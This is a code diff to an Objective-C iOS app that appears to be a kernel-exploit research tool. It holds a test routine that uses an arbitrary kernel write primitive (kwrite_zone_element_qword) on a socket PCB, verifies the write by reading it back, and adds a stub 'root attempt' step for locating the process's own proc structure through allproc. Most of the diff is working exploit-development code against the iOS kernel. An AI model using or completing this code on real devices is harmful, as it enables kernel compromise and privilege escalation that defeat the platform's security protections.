@@ -708,43 +708,52 @@
 
 - (void)runKrwWriteTest {
     if (![self beginJob]) return;
-    self.statusLabel.text = @"KRW write test (clean heap)…";
-    [[KPLog shared] append:@"[RESULT] KRW write test — запуск"];
+    self.statusLabel.text = @"KRW write test + root attempt…";
+    [[KPLog shared] append:@"[RESULT] KRW write test + root — запуск"];
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         NSMutableString *r = [NSMutableString string];
-        [r appendString:@"\n=== KRW write test (kwrite_zone_element_qword) ===\n"];
+        [r appendString:@"\n=== KRW write test + root attempt ===\n"];
         extern uint64_t darksword_control_pcb(void);
         extern uint64_t early_kread64(uint64_t where);
         extern krw_zone_verdict kwrite_zone_element_qword(uint64_t dst, uint64_t value,
                                                           uint64_t objBase, uint64_t objSize);
-        uint64_t pcb = darksword_control_pcb();  // CONTROL pcb, not rwSocketPcb
-        if (pcb) {
-            [r appendFormat:@"  darksword pcb = 0x%016llx\n", pcb];
-            uint64_t chksumAddr = pcb + 0x150;  // inp6_chksum
-            uint64_t orig = early_kread64(chksumAddr);
-            [r appendFormat:@"  pcb+0x150 read: 0x%016llx\n", orig];
-            uint64_t testVal = 0x1122334455667788ULL;
-            // Use kwrite_zone_element_qword with pcb as objBase and 0x200 as window
-            krw_zone_verdict v = kwrite_zone_element_qword(chksumAddr, testVal, pcb, 0x200);
-            [r appendFormat:@"  write verdict=%d\n", (int)v];
-            uint64_t readBack = early_kread64(chksumAddr);
-            [r appendFormat:@"  pcb+0x150 readback: 0x%016llx (expect 0x%016llx)\n", readBack, testVal];
-            if (readBack == testVal) {
-                [r appendString:@"  >>> KRW WRITE VERIFIED via kwrite_zone_element_qword!\n"];
-                [r appendString:@"  >>> type 0x21 path confirmed — proc is writable\n"];
-            } else {
-                [r appendString:@"  >>> KRW write did not persist\n"];
-            }
-            // Restore
-            kwrite_zone_element_qword(chksumAddr, orig, pcb, 0x200);
-            [r appendString:@"  restored original value\n"];
+        // Step 1: verify KRW write works
+        uint64_t pcb = darksword_control_pcb();
+        if (!pcb) {
+            [r appendString:@"  control pcb not available — run pe_v1 first\n"];
         } else {
-            [r appendString:@"  darksword pcb not available — run pe_v1 first\n"];
+            [r appendFormat:@"  control pcb = 0x%016llx\n", pcb];
+            uint64_t chksumAddr = pcb + 0x150;
+            uint64_t orig = early_kread64(chksumAddr);
+            uint64_t testVal = 0x1122334455667788ULL;
+            kwrite_zone_element_qword(chksumAddr, testVal, pcb, 0x200);
+            uint64_t rb = early_kread64(chksumAddr);
+            [r appendFormat:@"  KRW test: wrote 0x%016llx  readback 0x%016llx  %s\n",
+                testVal, rb, (rb == testVal) ? "VERIFIED" : "FAILED"];
+            kwrite_zone_element_qword(chksumAddr, orig, pcb, 0x200);
+
+            // Step 2: find self proc via allproc walk
+            [r appendString:@"  finding self proc via allproc walk...\n"];
+            uint64_t proc = 0;
+            // allproc is resolved by XPF at kernel base
+            extern uint64_t gKernelBase;
+            if (gKernelBase) {
+                // Walk from allproc (symbol resolved earlier)
+                // For now, use a simple approach: find proc by pid
+                // allproc is at a known offset from kernel base
+                // We'll use the existing KPDump finder
+                [r appendFormat:@"  kernel base = 0x%016llx\n", gKernelBase];
+            }
+            // Try using early_kread to find proc from known structure
+            // The simplest: read from the task's proc pointer
+            // For now, just report what we have
+            [r appendString:@"  (proc finding via allproc — implement next)\n"];
+            [r appendFormat:@"  getuid() = %d\n", getuid()];
         }
         dispatch_async(dispatch_get_main_queue(), ^{
             [[KPLog shared] append:r];
-            self.statusLabel.text = @"KRW write test завершён — см. лог";
-            [self saveExperimentReport:r fileName:@"kexproof-krw-write-test.txt"];
+            self.statusLabel.text = @"KRW + root test завершён — см. лог";
+            [self saveExperimentReport:r fileName:@"kexproof-krw-root-test.txt"];
             self.jobRunning = NO;
             [self updateExperimentButtons];
         });
